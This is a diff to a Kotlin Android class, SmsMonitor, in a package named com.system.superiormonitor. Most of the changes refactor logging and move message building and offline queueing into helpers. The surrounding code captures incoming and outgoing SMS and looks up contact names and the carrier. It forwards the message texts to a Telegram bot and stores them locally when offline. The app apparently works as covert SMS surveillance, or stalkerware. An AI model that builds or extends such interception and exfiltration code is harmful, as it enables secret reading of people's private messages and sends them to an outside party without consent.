@@ -1,5 +1,7 @@
 package com.system.superiormonitor.monitor
 
+import com.system.superiormonitor.util.LogLevel
+
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -40,6 +42,7 @@ class SmsMonitor(
     private val smsReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context?, intent: Intent?) {
             if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
+                LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: Incoming SMS broadcast received.")
                 val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                 if (messages.isEmpty()) return
                 
@@ -63,6 +66,7 @@ class SmsMonitor(
     private val smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
         override fun onChange(selfChange: Boolean) {
             super.onChange(selfChange)
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: DB change detected. Triggering check in 1s.")
             monitorScope.launch {
                 delay(1000) // Small delay to allow DB commit
                 processOutgoingSms()
@@ -89,6 +93,7 @@ class SmsMonitor(
                 }
             } catch (e: Exception) {
                 // Ignore fallback
+                LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: Failed to establish baseline ID (${e.message})", LogLevel.ERROR)
             }
 
             val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
@@ -97,11 +102,11 @@ class SmsMonitor(
             context.contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver)
 
             isRunning = true
-            LogManager.log(LogCategory.MONITOR, "SMS Monitor Started (Two-Way Sync).")
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Started (Two-Way Sync).")
         } catch (e: SecurityException) {
-            LogManager.log(LogCategory.MONITOR, "SMS Monitor Error: Missing Permissions.")
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: Missing Permissions.", LogLevel.ERROR)
         } catch (e: Exception) {
-            LogManager.log(LogCategory.MONITOR, "SMS Monitor Error: ${e.message}")
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: ${e.message}", LogLevel.ERROR)
         }
     }
 
@@ -112,9 +117,10 @@ class SmsMonitor(
             context.contentResolver.unregisterContentObserver(smsObserver)
             monitorJob.cancel()
             isRunning = false
-            LogManager.log(LogCategory.MONITOR, "SMS Monitor Stopped.")
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Stopped.")
         } catch (e: Exception) {
             // Ignore if not registered
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Error: Shutdown failed (${e.message})", LogLevel.ERROR)
         }
     }
 
@@ -128,6 +134,7 @@ class SmsMonitor(
             }
         } catch (e: Exception) {
             // Ignore fallback
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: Failed to fetch carrier name (${e.message})", LogLevel.ERROR)
         }
         return "Unknown"
     }
@@ -169,7 +176,7 @@ class SmsMonitor(
                 }
             }
         } catch (e: Exception) {
-            LogManager.log(LogCategory.MONITOR, "SMS Monitor Outgoing Check Error: ${e.message}")
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor Outgoing Check Error: ${e.message}", LogLevel.ERROR)
         }
         }
     }
@@ -186,6 +193,7 @@ class SmsMonitor(
             }
         } catch (e: Exception) {
             // Fallback to null
+            LogManager.log(LogCategory.BASIC_UPDATE, "SMS Monitor: Failed to lookup contact name (${e.message})", LogLevel.ERROR)
         }
         return null
     }
@@ -217,32 +225,15 @@ class SmsMonitor(
         val safeCarrierName = TelegramApi.escapeMarkdown(carrierName)
         val safeBody = TelegramApi.escapeMarkdown(body)
 
-        val output = """
-            #SMS
-            ===================
-            🔔 *NEW SMS* $headerAction
-            ===================
-
-            $fromOrToLabel: $fromToStrSafe
-            *Time*: $timeStr
-            *SIM*: $safeCarrierName
-            *Type*: $directionType
-
-            *Message*: $safeBody
-        """.trimIndent()
+        val output = com.system.superiormonitor.bot.BotMessages.Alerts.buildSmsMessage(
+            headerAction, fromOrToLabel, fromToStrSafe, timeStr, safeCarrierName, directionType, safeBody
+        )
         
-        LogManager.log(LogCategory.MONITOR, "SMS: $directionType message processed for $address")
+        LogManager.log(LogCategory.BASIC_UPDATE, "SMS: $directionType message processed for $address")
 
-        val prefsManager = com.system.superiormonitor.data.PrefsManager.getInstance(context)
-        if (TelegramApi.isApiReachable(context, prefsManager.botToken)) {
-            onUpdate(output, "Markdown")
-            delay(3000)
-        } else {
-            val offlineDir = File(context.getExternalFilesDir(null), "sms_alrt/offline")
-            if (!offlineDir.exists()) offlineDir.mkdirs()
-            val offlineFile = File(offlineDir, "offline_sms.txt")
-            offlineFile.appendText(output + "\n\n")
-            LogManager.log(LogCategory.MONITOR, "Device offline. SMS update queued locally.")
-        }
+        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+            context, output, "sms_alrt", "offline_sms.txt", onUpdate
+        )
+        delay(3000)
     }
 }
